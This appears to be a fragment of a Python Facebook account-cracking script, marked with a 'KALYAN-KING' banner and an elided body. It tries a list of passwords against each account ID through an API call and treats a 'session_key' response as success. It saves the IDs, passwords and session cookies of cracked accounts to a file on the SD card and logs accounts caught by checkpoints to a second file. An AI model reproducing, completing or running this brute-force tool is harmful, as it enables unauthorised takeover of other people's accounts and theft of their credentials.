...
device = {
        ...
        'fbca':fbca,
        'fbdm':fbdm}
try:os.mkdir('/sdcard/=[KALYAN-KGF-BRO]=')
except:pass
...
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝     {R}/{A}V-0.1
{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤   
{A}({R}+{A}) {A}DEVLOPER {R}: {A} KALYAN-KING
{A}({R}+{A}) {A}FACEBOOK {R}: {A}KALYAN-KING
{A}({R}+{A}) {A}GITHUB   {R}: {A}FUK-123
{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤   
 {Y}➤ {A}USER TOKEN  {R}:{G}
{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
print(logo)
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r\r{R}({A}Kalyan💓👌-KING😉😉😉-123{R}) {R}- {R}({A}METHOD-N{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/KALYAN-KGF-OK.txt', 'a').write(ids+' | '+pas+' | '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R}({A}DEATH{R}) '+ids+' | '+pas+'{R}')
                                                open('/sdcard/Kalyan💓👌-KING😉😉😉-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
